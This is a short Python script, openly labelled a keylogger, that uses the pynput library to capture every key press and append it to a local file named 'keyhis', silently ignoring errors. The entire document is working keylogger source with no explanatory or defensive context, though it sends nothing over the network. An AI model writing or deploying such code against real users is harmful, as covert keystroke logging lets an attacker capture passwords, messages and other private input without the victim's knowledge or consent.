from pynput.keyboard import Listener
print("Keylogger is on")
def log_key(key):
    try:
        with open("keyhis","a")as f:
            f.write(f"{key}\n")
    except:
       pass
try:
    
     with Listener(on_press=log_key) as a:
         a.join()
except KeyboardInterrupt:
    print("Listener stopped by user")
except :
        pass    
